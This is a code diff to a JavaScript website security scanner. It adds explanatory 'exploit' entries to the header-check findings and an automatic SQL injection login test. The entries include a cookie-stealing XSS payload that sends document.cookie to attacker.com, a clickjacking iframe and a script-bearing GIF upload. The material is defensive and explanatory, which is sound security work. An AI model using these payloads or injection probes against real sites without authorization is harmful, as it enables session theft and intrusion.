@@ -4,6 +4,7 @@ import tls from "tls";
 import { URL } from "url";
 import { generateAiRecommendations } from "./ai.js"; // optional - keep if you have ai.js
 import puppeteer from "puppeteer";
+import { testLoginSQLInjection, generateSQLInjectionReport } from "./sqlInjectionTest.js";
 
 /**
  * Simple exponential backoff retry wrapper.
@@ -94,6 +95,11 @@ function runHeaderChecks(headers) {
       description: "No CSP header found — increases risk of XSS and data injection.",
       remediation:
         "Add a restrictive Content-Security-Policy. Example: Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example.com; object-src 'none';",
+      exploit: {
+        loophole: "Without CSP, the browser has no restrictions on what scripts can execute or where resources can be loaded from.",
+        attackVector: "An attacker can inject malicious scripts through XSS vulnerabilities, and the browser will execute them without any policy restrictions.",
+        examplePayload: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n\nThis payload steals cookies and sends them to an attacker-controlled server."
+      }
     });
   } else {
     // quick detection of very permissive CSP
@@ -117,6 +123,11 @@ function runHeaderChecks(headers) {
       owasp: "A06:2021",
       description: "Strict-Transport-Security not set; site may allow insecure connections.",
       remediation: "Add Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
+      exploit: {
+        loophole: "Without HSTS, browsers may initially connect via HTTP before upgrading to HTTPS, creating a window for man-in-the-middle attacks.",
+        attackVector: "An attacker on the same network can intercept the initial HTTP request and downgrade the connection or steal session tokens.",
+        examplePayload: "User types 'example.com' → Browser tries http://example.com first → Attacker intercepts and serves fake login page → Credentials stolen"
+      }
     });
   }
 
@@ -128,6 +139,11 @@ function runHeaderChecks(headers) {
       owasp: "A05:2021",
       description: "No X-Frame-Options or CSP frame-ancestors; page may be embedded in frames.",
       remediation: "Add X-Frame-Options: DENY or set CSP frame-ancestors 'none'.",
+      exploit: {
+        loophole: "The application can be embedded in an iframe on any malicious website without restrictions.",
+        attackVector: "An attacker creates a malicious page with your site in an invisible iframe, overlaying fake UI elements to trick users into performing actions.",
+        examplePayload: "<iframe src='https://yoursite.com/transfer' style='opacity:0'></iframe>\n<button style='position:absolute;top:100px'>Click to win!</button>\n\nUser clicks 'win' button but actually clicks 'transfer money' in the hidden iframe."
+      }
     });
   }
 
@@ -139,6 +155,11 @@ function runHeaderChecks(headers) {
       owasp: "A06:2021",
       description: "No X-Content-Type-Options header; some MIME sniffing risk remains.",
       remediation: "Add X-Content-Type-Options: nosniff",
+      exploit: {
+        loophole: "Browsers may MIME-sniff content and execute files differently than intended based on their content rather than declared Content-Type.",
+        attackVector: "An attacker uploads a file disguised as an image but containing JavaScript. The browser sniffs it and executes it as a script.",
+        examplePayload: "Upload 'image.jpg' containing: GIF89a<script>alert('XSS')</script>\n\nBrowser detects HTML/JS and executes it despite .jpg extension."
+      }
     });
   }
 
@@ -373,6 +394,21 @@ export async function scanTarget(rawUrl) {
       });
     }
   } catch (e) {}
+
+  // SQL Injection testing (for authorized penetration testing only)
+  console.log("🔍 Testing for SQL injection vulnerabilities...");
+  try {
+    const sqlInjectionResults = await testLoginSQLInjection(url.toString());
+    if (sqlInjectionResults.vulnerable) {
+      const sqlReport = generateSQLInjectionReport(sqlInjectionResults);
+      if (sqlReport) {
+        vulnerabilities.push(sqlReport);
+        console.log("⚠️  SQL Injection vulnerability detected!");
+      }
+    }
+  } catch (sqlErr) {
+    console.log("SQL injection test failed:", sqlErr.message);
+  }
 
   // AI recommendations: try to call external function if available
   try {
